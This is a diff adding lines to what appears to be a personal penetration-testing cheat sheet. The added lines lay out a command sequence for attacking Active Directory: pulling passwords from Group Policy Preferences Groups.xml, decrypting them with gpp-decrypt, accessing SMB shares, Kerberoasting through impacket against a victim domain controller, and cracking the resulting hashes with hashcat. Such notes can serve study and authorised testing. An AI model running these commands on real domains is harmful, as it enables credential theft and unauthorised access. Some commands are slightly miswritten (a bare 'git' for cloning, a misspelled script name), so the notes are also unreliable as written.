@@ -88,4 +88,19 @@ https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 #For application examples;
 https://www.youtube.com/watch?v=Fms9UuW05DA&list=PLi0kul0fEhZ9LNZN0-A3nX2xcx2R70JwN
 
+
+#Groups.xml
+ 
+ get Groups.xml
+ cat Groups.xml (name, password)
+ gpp-Decrypt password      #decryp_password
+ smbclient -W <domain_name> -U name //<domain_name>/share_name
+ 
+ 
+ #SPN
+ 
+  git https://github.com/SecureAuthCorp/impacket.git
+  python GetUsersSPN.py <domain_name>/user:decrypt_password -dc-ip <victim_ip> -request
+  hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
+  
 -------------------------------------------------------------------------------------------------------------------------------
